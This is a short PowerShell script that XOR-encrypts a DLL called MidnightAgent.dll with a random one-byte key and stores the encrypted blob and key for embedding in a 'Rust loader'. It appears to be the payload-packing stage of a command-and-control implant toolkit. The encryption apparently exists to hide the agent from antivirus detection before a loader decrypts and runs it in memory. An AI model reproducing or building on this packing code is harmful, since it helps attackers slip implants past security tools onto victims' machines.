# Script to encrypt MidnightAgent.dll for the Rust loader
$scriptDir = $PSScriptRoot
$dllPath = [System.IO.Path]::GetFullPath((Join-Path $scriptDir "..\MidnightAgent\bin\Release\net48\MidnightAgent.dll"))
$outputPath = Join-Path $scriptDir "src\agent.bin.enc"
$keyPath = Join-Path $scriptDir "src\key.bin"

Write-Host "[*] Script Dir: $scriptDir"
Write-Host "[*] Target DLL: $dllPath"

# Generate Random XOR Key
$key = Get-Random -Minimum 1 -Maximum 255
[System.IO.File]::WriteAllBytes($keyPath, @([byte]$key))

Write-Host "[*] Random XOR Key Generated: 0x$($key.ToString('X2'))" -ForegroundColor Yellow

if (Test-Path $dllPath) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($dllPath)
        for($i=0; $i -lt $bytes.Length; $i++) {
            $bytes[$i] = $bytes[$i] -bxor $key
        }
        [System.IO.File]::WriteAllBytes($outputPath, $bytes)
        Write-Host "✅ Success! Encrypted DLL saved to: $outputPath" -ForegroundColor Green
    } catch {
        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "❌ Error: DLL not found at $dllPath" -ForegroundColor Red
}
